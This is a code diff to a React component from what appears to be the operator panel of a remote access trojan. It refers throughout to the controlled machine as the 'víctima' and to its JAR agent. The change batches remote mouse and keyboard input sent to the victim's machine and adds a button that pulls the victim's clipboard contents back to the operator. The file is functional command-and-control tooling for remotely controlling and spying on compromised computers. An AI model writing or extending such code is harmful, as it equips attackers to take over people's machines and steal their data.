@@ -1,6 +1,6 @@
 'use client';
 import { useCallback, useEffect, useRef, useState } from 'react';
-import { ClipboardPaste, Maximize, Monitor, Pause, Play, RefreshCw } from 'lucide-react';
+import { ClipboardCopy, ClipboardPaste, Maximize, Monitor, Pause, Play, RefreshCw } from 'lucide-react';
 import { mutate } from '@/hooks/useApi';
 import { api } from '@/lib/api';
 import type { Task, Victim } from '@/lib/types';
@@ -8,6 +8,7 @@ import { Badge } from '@/components/ui/badge';
 import { Button } from '@/components/ui/button';
 import { humanError } from '@/lib/errors';
 import { toast } from 'sonner';
+import { versionAtLeast } from '@/lib/actions';
 
 type Screen = { index: number; width: number; height: number; primary: boolean };
 
@@ -21,11 +22,15 @@ export function RemoteDesktop({ victim }: { victim: Victim }) {
   const [latency, setLatency] = useState<number | null>(null);
   const [error, setError] = useState<string | null>(null);
   const [screens, setScreens] = useState<Screen[]>([]);
-  const [clipboardSync, setClipboardSync] = useState(false);
+  const [syncBusy, setSyncBusy] = useState(false);
   const box = useRef<HTMLDivElement | null>(null);
+  const supported = versionAtLeast(victim.agentVersion, '0.4.1');
   const playingRef = useRef(false);
   const busy = useRef(false);
   const lastMove = useRef(0);
+  const queue = useRef<Array<Record<string, unknown>>>([]);
+  const flushTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
+  const flushing = useRef(false);
 
   const grab = useCallback(async () => {
     if (!playingRef.current || busy.current) return;
@@ -95,6 +100,7 @@ export function RemoteDesktop({ victim }: { victim: Victim }) {
   function stop() {
     playingRef.current = false;
     setPlaying(false);
+    void flush();
   }
 
   function point(event: React.MouseEvent) {
@@ -107,19 +113,31 @@ export function RemoteDesktop({ victim }: { victim: Victim }) {
     };
   }
 
-  function send(name: string, params: Record<string, unknown>) {
-    void mutate('/tasks', 'POST', { victim_ids: [victim.id], name, params, timeout_sec: 10 }).catch(() => undefined);
-  }
+  const flush = useCallback(async () => {
+    if (flushing.current || queue.current.length === 0) return;
+    if (flushTimer.current) { clearTimeout(flushTimer.current); flushTimer.current = null; }
+    const events = queue.current.splice(0, 64);
+    flushing.current = true;
+    try {
+      await mutate('/tasks', 'POST', { victim_ids: [victim.id], name: 'input:batch', params: { events }, timeout_sec: 10 });
+    } catch { /* el siguiente gesto reintenta */ } finally { flushing.current = false; }
+  }, [victim.id]);
+
+  const enqueue = useCallback((event: Record<string, unknown>, immediate = false) => {
+    queue.current.push(event);
+    if (immediate) { void flush(); return; }
+    if (!flushTimer.current) flushTimer.current = setTimeout(() => { flushTimer.current = null; void flush(); }, 70);
+  }, [flush]);
 
   function onMove(event: React.MouseEvent) {
     const now = Date.now();
-    if (now - lastMove.current < 55) return;
+    if (now - lastMove.current < 45) return;
     lastMove.current = now;
-    send('input:mouse', { action: 'move', ...point(event), screen });
+    enqueue({ t: 'm', ...point(event), screen });
   }
 
   function onWheel(event: React.WheelEvent) {
-    send('input:mouse', { action: 'wheel', ...point(event), screen, delta: event.deltaY > 0 ? 1 : -1 });
+    enqueue({ t: 'w', ...point(event), screen, d: event.deltaY > 0 ? 1 : -1 }, true);
   }
 
   const SPECIAL: Record<string, number> = { Enter: 10, Tab: 9, Escape: 27, Backspace: 8, Delete: 127, ' ': 32, ArrowUp: 38, ArrowDown: 40, ArrowLeft: 37, ArrowRight: 39, Control: 17, Shift: 16, Alt: 18 };
@@ -128,21 +146,41 @@ export function RemoteDesktop({ victim }: { victim: Victim }) {
     if (!vk) return;
     event.preventDefault();
     const modifiers = [event.ctrlKey && 'ctrl', event.shiftKey && 'shift', event.altKey && 'alt', event.metaKey && 'meta'].filter(Boolean) as string[];
-    send('input:key', { action, vk, key: event.key.length === 1 ? event.key : '', modifiers });
+    enqueue({ t: 'k', vk, key: event.key.length === 1 ? event.key : '', mods: modifiers }, true);
   }
 
-  async function syncClipboard() {
+  async function sendClipboard() {
+    setSyncBusy(true);
     try {
-      if (clipboardSync) {
-        await mutate('/tasks', 'POST', { victim_ids: [victim.id], name: 'clipboard:get', params: {}, timeout_sec: 20 });
-      } else {
-        const text = await navigator.clipboard.readText();
-        await mutate('/tasks', 'POST', { victim_ids: [victim.id], name: 'clip_set', params: { text: text.slice(0, 128) }, timeout_sec: 20 });
-        toast.success('Portapapeles enviado a la víctima');
+      const text = await navigator.clipboard.readText();
+      await mutate('/tasks', 'POST', { victim_ids: [victim.id], name: 'clip_set', params: { text: text.slice(0, 128) }, timeout_sec: 20 });
+      toast.success('Portapapeles enviado a la víctima');
+    } catch (caught) {
+      toast.error(humanError(caught) || 'El navegador no dio acceso al portapapeles');
+    } finally { setSyncBusy(false); }
+  }
+
+  async function pullClipboard() {
+    setSyncBusy(true);
+    try {
+      const created = await mutate<{ items: Array<{ id: string }> }>('/tasks', 'POST', { victim_ids: [victim.id], name: 'clipboard:get', params: {}, timeout_sec: 20 });
+      const id = created.items[0]?.id;
+      if (!id) return;
+      for (let tries = 0; tries < 50; tries += 1) {
+        const list = await api<{ items: Task[] }>(`/tasks?victim=${victim.id}&name=clipboard:get&limit=3`);
+        const task = list.items.find((item) => item.id === id);
+        if (task?.status === 'done') {
+          const content = String((task.result as { content?: string } | null)?.content ?? '');
+          await navigator.clipboard.writeText(content);
+          toast.success(`Portapapeles traído (${content.length} caracteres)`);
+          break;
+        }
+        if (task?.status === 'error') { toast.error(task.error ?? 'clipboard_get_failed'); break; }
+        await new Promise((resolve) => setTimeout(resolve, 120));
       }
     } catch (caught) {
       toast.error(humanError(caught));
-    }
+    } finally { setSyncBusy(false); }
   }
 
   return (
@@ -166,8 +204,9 @@ export function RemoteDesktop({ victim }: { victim: Victim }) {
             </select>
           ) : null}
           <Button size="icon" variant="ghost" title="Ajustar a ventana" aria-label="Ajustar a ventana" onClick={() => void box.current?.requestFullscreen?.()}><Maximize className="h-3 w-3" /></Button>
-          <Button size="icon" variant="ghost" title="Sincronizar portapapeles" aria-label="Sincronizar portapapeles" onClick={() => { setClipboardSync((value) => !value); void syncClipboard(); }}><ClipboardPaste className={clipboardSync ? 'h-3 w-3 text-brand' : 'h-3 w-3'} /></Button>
-          {playing ? <Button size="sm" variant="destructive" onClick={stop}><Pause className="h-3 w-3" /> pausa</Button> : <Button size="sm" disabled={!victim.socket} onClick={() => void start()}><Play className="h-3 w-3" /> ver</Button>}
+          <Button size="sm" variant="secondary" disabled={!victim.socket || syncBusy} onClick={() => void sendClipboard()} title="Enviar el portapapeles del panel a la víctima"><ClipboardPaste className="h-3 w-3" /> enviar</Button>
+          <Button size="sm" variant="secondary" disabled={!victim.socket || syncBusy} onClick={() => void pullClipboard()} title="Traer el portapapeles de la víctima"><ClipboardCopy className="h-3 w-3" /> traer</Button>
+          {playing ? <Button size="sm" variant="destructive" onClick={stop}><Pause className="h-3 w-3" /> pausa</Button> : <Button size="sm" disabled={!victim.socket || !supported} onClick={() => void start()}><Play className="h-3 w-3" /> ver</Button>}
         </div>
       </div>
 
@@ -179,9 +218,9 @@ export function RemoteDesktop({ victim }: { victim: Victim }) {
         aria-label="Escritorio de la víctima"
         className="mt-1.5 min-h-[200px] overflow-hidden rounded border border-line bg-black/50 outline-none focus:ring-1 focus:ring-brand"
         onMouseMove={onMove}
-        onClick={(event) => send('input:mouse', { action: 'click', ...point(event), screen })}
-        onDoubleClick={(event) => send('input:mouse', { action: 'double', ...point(event), screen })}
-        onContextMenu={(event) => { event.preventDefault(); send('input:mouse', { action: 'right', ...point(event), screen }); }}
+        onClick={(event) => enqueue({ t: 'c', ...point(event), screen }, true)}
+        onDoubleClick={(event) => { enqueue({ t: 'c', ...point(event), screen }, true); enqueue({ t: 'c', ...point(event), screen }, true); }}
+        onContextMenu={(event) => { event.preventDefault(); enqueue({ t: 'r', ...point(event), screen }, true); }}
         onWheel={onWheel}
         onKeyDown={(event) => onKey(event, 'down')}
         onKeyUp={(event) => onKey(event, 'up')}
@@ -190,9 +229,10 @@ export function RemoteDesktop({ victim }: { victim: Victim }) {
           <p className="grid min-h-[200px] place-items-center text-2xs text-muted">{playing ? 'Pidiendo el primer fotograma…' : 'Pulsa ver para abrir el escritorio. Clic y teclado se reenvían.'}</p>
         )}
       </div>
-      {image ? <p className="mt-1 text-2xs text-muted/70">{image.width}×{image.height} · {fps} fps objetivo · pantalla {screen + 1} · portapapeles {clipboardSync ? 'panel→víctima' : 'manual'}</p> : null}
+      {image ? <p className="mt-1 text-2xs text-muted/70">{image.width}×{image.height} · {fps} fps objetivo · pantalla {screen + 1} · portapapeles manual</p> : null}
       {!victim.socket ? <p className="mt-1 text-2xs text-warn">Sin socket de control.</p> : null}
-      <p className="mt-1 text-2xs text-muted/70">Fotograma a fotograma sobre el canal actual (sin WebRTC): la entrada se envía como tareas input:mouse / input:key.</p>
+      {!supported ? <p className="mt-1 text-2xs text-warn">Requiere agente 0.4.1; actualiza el JAR de la víctima.</p> : null}
+      <p className="mt-1 text-2xs text-muted/70">Fotograma a fotograma sobre el canal actual (sin WebRTC): la entrada se agrupa en lotes input:batch.</p>
       <p className="hidden"><RefreshCw /></p>
     </section>
   );
